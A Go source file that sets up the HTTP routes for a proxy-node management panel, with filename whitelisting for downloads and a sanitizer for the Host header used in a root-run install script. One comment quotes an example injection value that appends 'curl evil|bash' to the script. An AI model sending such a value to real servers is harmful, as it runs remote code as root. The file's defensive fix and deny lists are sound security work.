package master

import (
	_ "embed"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	"work-v/internal/master/api"
	"work-v/internal/master/hub"
	"work-v/internal/master/middleware"
	"work-v/internal/master/model"
	"work-v/internal/master/sub"

	"github.com/gin-gonic/gin"
	qrcode "github.com/skip2/go-qrcode"
)

//go:embed install.sh
var defaultInstallScript string

// SetupRouter 注册 Master 全部路由规则
func SetupRouter(webDistFS http.FileSystem) *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()

	_ = r.SetTrustedProxies([]string{"127.0.0.1", "::1"})
	r.Use(gin.Recovery())
	r.Use(middleware.CORSMiddleware())
	r.Use(middleware.SecurityHeaders())
	r.Use(middleware.SafeEntranceFilter())

	// 1. Agent 反向长连通道 (免鉴权，通过长连协议首包 Token 认证)
	r.GET("/ws/agent", func(c *gin.Context) {
		hub.GlobalHub.HandleWebSocket(c.Writer, c.Request)
	})

	// 2. 外部多端自适应订阅接口
	r.GET("/sub/:token", sub.HandleSubscription)

	// 3. 节点一键智能安装脚本动态分发
	r.GET("/install.sh", handleAgentInstallScript)
	r.GET("/api/v1/install.sh", handleAgentInstallScript)

	// 4. 二进制产物、CLI 工具与安装脚本安全分发 (严格白名单限制，杜绝任意文件与数据库读取)
	r.GET("/download/:filename", func(c *gin.Context) {
		rawName := c.Param("filename")
		filename := filepath.Base(filepath.Clean(rawName))

		if filename == "." || filename == "/" || filename == "\\" || strings.Contains(rawName, "..") {
			c.String(http.StatusBadRequest, "Invalid filename")
			return
		}

		if filename == "install.sh" {
			handleAgentInstallScript(c)
			return
		}

		// 严格白名单校验
		allowedPrefixes := []string{"agent-", "work-v-agent", "master-", "work-v-master", "work-v", "bt-v"}
		isAllowed := false
		for _, prefix := range allowedPrefixes {
			if strings.HasPrefix(filename, prefix) {
				isAllowed = true
				break
			}
		}

		// 拒绝数据库、配置、源码、证书与隐藏文件。
		// 注意必须用"包含"而不是"后缀": 历史实现只判断后缀, 于是 work-v.db.bak /
		// config.yml.bak 这类备份文件会把数据库(含管理员哈希与节点 Token)匿名泄露出去。
		blockedSubstrings := []string{".db", ".env", ".go", ".yml", ".yaml", ".json", ".conf", ".pem", ".key", ".log", ".bak", ".."}
		blocked := strings.HasPrefix(filename, ".")
		for _, s := range blockedSubstrings {
			if strings.Contains(filename, s) {
				blocked = true
				break
			}
		}
		for _, ch := range filename {
			isSafe := (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '.' || ch == '-' || ch == '_'
			if !isSafe {
				blocked = true
				break
			}
		}
		if !isAllowed || blocked {
			c.String(http.StatusForbidden, "Access denied")
			return
		}

		candidates := []string{
			filepath.Join("/opt/work-v-master", filename),
			filepath.Join(".", filename),
		}
		if strings.HasPrefix(filename, "agent-") || strings.HasPrefix(filename, "work-v-agent") {
			candidates = append(candidates,
				filepath.Join("/opt/work-v-master", "work-v-agent"),
				filepath.Join("/opt/work-v-master", "work-v-agent-linux"),
				filepath.Join(".", "work-v-agent"),
				filepath.Join(".", "work-v-agent-linux"),
			)
		}
		if strings.HasPrefix(filename, "master-") || strings.HasPrefix(filename, "work-v-master") {
			candidates = append(candidates,
				filepath.Join("/opt/work-v-master", "work-v-master"),
				filepath.Join("/opt/work-v-master", "work-v-master-linux"),
				filepath.Join(".", "work-v-master"),
				filepath.Join(".", "work-v-master-linux"),
			)
		}
		if filename == "work-v" || filename == "bt-v" {
			candidates = append(candidates,
				filepath.Join("/opt/work-v-master", "scripts", "work-v"),
				filepath.Join(".", "scripts", "work-v"),
				filepath.Join("/usr/local/bin", "work-v"),
			)
		}
		for _, p := range candidates {
			if st, err := os.Stat(p); err == nil && !st.IsDir() {
				c.File(p)
				return
			}
		}
		c.String(http.StatusNotFound, "File not found")
	})

	// 5. 原生离线二维码生成接口 (纯本地零外网依赖，杜绝被墙与隐私泄露)
	r.GET("/api/v1/qrcode", func(c *gin.Context) {
		text := c.Query("text")
		if text == "" {
			c.String(http.StatusBadRequest, "text query parameter is required")
			return
		}
		png, err := qrcode.Encode(text, qrcode.Medium, 256)
		if err != nil {
			c.String(http.StatusInternalServerError, "failed to generate qrcode")
			return
		}
		c.Header("Cache-Control", "public, max-age=86400")
		c.Data(http.StatusOK, "image/png", png)
	})

	// 6. REST API 分组
	v1 := r.Group("/api/v1")
	{
		// 认证公开接口
		auth := v1.Group("/auth")
		{
			auth.POST("/login", api.HandleLogin)
		}

		// 管理员受保护接口
		admin := v1.Group("/admin")
		admin.Use(middleware.AdminAuthRequired())
		{
			admin.POST("/change-password", api.HandleChangePassword)
			admin.GET("/dashboard", api.HandleGetDashboard)

			// 安全入口设置
			admin.GET("/safe-entrance", api.HandleGetSafeEntrance)
			admin.POST("/safe-entrance", api.HandleSetSafeEntrance)

			// 节点管理与远程运维
			admin.GET("/nodes", api.HandleGetNodes)
			admin.POST("/nodes", api.HandleCreateNode)
			admin.PUT("/nodes/:id", api.HandleUpdateNode)
			admin.DELETE("/nodes/:id", api.HandleDeleteNode)
			admin.POST("/nodes/:id/sync", api.HandleSyncNode)
			admin.GET("/nodes/:id/links", api.HandleGetNodeLinks)
			admin.GET("/nodes/:id/inbounds", api.HandleGetNodeInbounds)
			admin.PUT("/nodes/:id/inbounds", api.HandleUpdateNodeInbounds)
			admin.GET("/generate-reality-keys", api.HandleGenerateRealityKeys)
			admin.POST("/nodes/:id/restart", api.HandleRestartNodeSingbox)
			admin.GET("/nodes/:id/logs", api.HandleGetNodeLogs)
			admin.POST("/nodes/:id/ping", api.HandlePingNode)

			// 一键自动部署 (SSH 纳管) 与进度查询
			admin.POST("/auto-deploy", api.HandleAutoDeployNode)
			admin.GET("/auto-deploy/:id", api.HandleGetAutoDeployStatus)

			// sing-box 内核管理与在线升级 (借鉴 iwantrun 最佳实践)
			admin.GET("/singbox/version", api.HandleGetSingboxVersion)
			admin.POST("/singbox/upgrade", api.HandleUpgradeSingbox)

			// 系统开放端口、综合诊断与系统配置
			admin.GET("/system/ports", api.HandleGetOpenPorts)
			admin.GET("/system/diagnostic", api.HandleGetDiagnostic)
			admin.GET("/system/settings", api.HandleGetSystemSettings)
			admin.POST("/system/settings", api.HandleUpdateSystemSettings)
			admin.GET("/system/backup", api.HandleBackupDB)

			// 用户管理与批量运维
			admin.GET("/users", api.HandleGetUsers)
			admin.POST("/users", api.HandleCreateUser)
			admin.POST("/users/batch", api.HandleBatchCreateUsers)
			admin.POST("/users/reset-all", api.HandleBatchResetTraffic)
			admin.PUT("/users/:id", api.HandleUpdateUser)
			admin.DELETE("/users/:id", api.HandleDeleteUser)
			admin.POST("/users/:id/regenerate", api.HandleRegenerateUserCredentials)
		}
	}

	// 5. 前端静态文件托管 (SPA 支持)
	if webDistFS != nil {
		// 登记根目录下的静态资源, 只有这些文件允许在未通过安全入口时访问
		middleware.SetAllowedStaticAssets(scanStaticAssets(webDistFS))

		// 注入直接输出 index.html 的渲染器，确保安全路径访问时直接就地渲染面板，无需跳转
		middleware.SetIndexHTMLHandler(func(c *gin.Context) {
			f, err := webDistFS.Open("/index.html")
			if err != nil {
				c.String(http.StatusInternalServerError, "index.html not found")
				return
			}
			defer f.Close()
			stat, err := f.Stat()
			if err != nil {
				c.String(http.StatusInternalServerError, "stat index.html error")
				return
			}
			c.Header("Content-Type", "text/html; charset=utf-8")
			c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
			http.ServeContent(c.Writer, c.Request, "index.html", stat.ModTime(), f)
		})

		fileServer := http.FileServer(webDistFS)
		r.NoRoute(func(c *gin.Context) {
			path := c.Request.URL.Path
			// 如果是 API 或子路径找不到返回 404
			if strings.HasPrefix(path, "/api/") || strings.HasPrefix(path, "/ws/") || strings.HasPrefix(path, "/sub/") {
				c.JSON(http.StatusNotFound, gin.H{"error": "API route not found"})
				return
			}
			// 否则尝试静态资源， fallback 到 index.html
			f, err := webDistFS.Open(strings.TrimPrefix(path, "/"))
			if err == nil {
				f.Close()
				fileServer.ServeHTTP(c.Writer, c.Request)
				return
			}
			// 看起来像静态资源却不存在的路径直接 404, 不再回落 index.html。
			// 否则未通过安全入口的 /x.js 也能把面板 HTML 取走 (见 SafeEntranceFilter)。
			if path != "/" && filepath.Ext(path) != "" {
				c.String(http.StatusNotFound, "404 page not found")
				return
			}
			c.Request.URL.Path = "/"
			fileServer.ServeHTTP(c.Writer, c.Request)
		})
	}

	return r
}

// scanStaticAssets 列出前端产物根目录下的静态资源 (index.html 不在免检之列)。
// 安全入口依赖这份白名单, 只有真实存在的资源才允许绕过入口拦截。
func scanStaticAssets(webDistFS http.FileSystem) []string {
	f, err := webDistFS.Open("/")
	if err != nil {
		return nil
	}
	defer f.Close()

	entries, err := f.Readdir(-1)
	if err != nil {
		return nil
	}
	names := make([]string, 0, len(entries))
	for _, e := range entries {
		if e.IsDir() || e.Name() == "index.html" {
			continue
		}
		names = append(names, "/"+e.Name())
	}
	return names
}

// handleAgentInstallScript 动态生成并返回主副节点智能自适应安装脚本
func handleAgentInstallScript(c *gin.Context) {
	scheme := "http"
	if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
		scheme = "https"
	}
	// Host 头完全由客户端控制, 必须严格校验后才能拼进"即将以 root 执行"的安装脚本。
	// 历史实现直接 sprintf 且使用 ReplaceAllString (会把 $1 当捕获组解析),
	// 构造 Host: a.com";curl evil|bash;# 即可把任意命令注入脚本。
	host, ok := sanitizeHost(c.Request.Host)
	if !ok {
		c.String(http.StatusBadRequest, "Invalid Host header")
		return
	}
	masterURL := fmt.Sprintf("%s://%s", scheme, host)

	// 优先使用配置的外网主控域名
	if customDomain := model.GetSetting("master_domain", ""); customDomain != "" {
		if strings.HasPrefix(customDomain, "http://") || strings.HasPrefix(customDomain, "https://") {
			masterURL = customDomain
		} else {
			masterURL = "https://" + customDomain
		}
	}

	// 优先从本地/安装目录读取最新 install.sh，若无则使用编译期内置嵌入的 defaultInstallScript
	script := defaultInstallScript
	candidates := []string{
		"scripts/install.sh",
		"/opt/work-v-master/scripts/install.sh",
		"internal/master/install.sh",
		"install.sh",
	}
	for _, p := range candidates {
		if content, err := os.ReadFile(p); err == nil && len(content) > 0 {
			script = string(content)
			break
		}
	}

	// 动态注入主控端地址
	re := regexp.MustCompile(`DEFAULT_SERVER="[^"]*"`)
	// 必须使用 Literal 版本: ReplaceAllString 会把替换串里的 $1/${name} 当作捕获组展开
	script = re.ReplaceAllLiteralString(script, fmt.Sprintf(`DEFAULT_SERVER="%s"`, masterURL))

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
	c.String(http.StatusOK, script)
}

// sanitizeHost 校验并规范化 Host 头 (host[:port])。
// 只接受合法域名或 IP 与数字端口, 引号/分号/$/空白/斜杠等一律拒绝。
func sanitizeHost(raw string) (string, bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" || len(raw) > 255 {
		return "", false
	}

	host, port := raw, ""
	if h, p, err := net.SplitHostPort(raw); err == nil {
		host, port = h, p
	}
	host = strings.Trim(host, "[]") // IPv6
	if host == "" {
		return "", false
	}

	if net.ParseIP(host) == nil {
		for _, ch := range host {
			isAlnum := (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')
			if isAlnum || ch == '.' || ch == '-' || ch == '_' {
				continue
			}
			return "", false
		}
	}

	if port != "" {
		n, err := strconv.Atoi(port)
		if err != nil || n < 1 || n > 65535 {
			return "", false
		}
		return net.JoinHostPort(host, port), true
	}
	return host, true
}
